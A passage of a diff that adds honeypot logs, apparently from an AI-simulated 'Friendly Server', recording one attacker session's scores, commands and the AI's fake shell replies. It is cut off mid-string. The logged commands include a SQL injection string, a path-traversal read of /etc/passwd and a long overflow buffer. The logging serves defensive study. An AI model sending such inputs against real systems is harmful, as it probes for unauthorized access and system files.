+        "curiosity": {
+            "commands_executed": 4,
+            "unique_commands": 3,
+            "directories_visited": 2,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 21
+        },
+        "engagement": {
+            "session_duration": 182,
+            "commands_executed": 4,
+            "successful_commands": 2,
+            "failed_commands": 2,
+            "files_accessed": 1,
+            "services_accessed": 0,
+            "engagement_score": 34,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 21,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 8,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "' OR '1'='1",
+            "' OR '1'='1",
+            "cat ../../../etc/passwd",
+            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+        ],
+        "confidence_score": 0.7
+    }
+}
+2026-07-23 17:13:05,755 - {"session_id": "9b66e74f", "command": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "attack_type": "Unknown", "risk_score": 8, "threat_level": "LOW"}
+2026-07-23 17:13:05,755 - {
+    "session_id": "9b66e74f",
+    "command": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "ai_decision": "Welcome to Friendly Server! \n\nFriendly Server:~$ /bin/bash /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "9b66e74f",
+        "interaction_count": 4
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 8,
+    "threat_level": "LOW"
+}
+2026-07-23 17:13:05,755 - {
+    "session_id": "9b66e74f",
+    "conversation_log": "Attacker executed: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "ai_decision": "Welcome to Friendly Server! \n\nFriendly Server:~$ /bin/bash /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA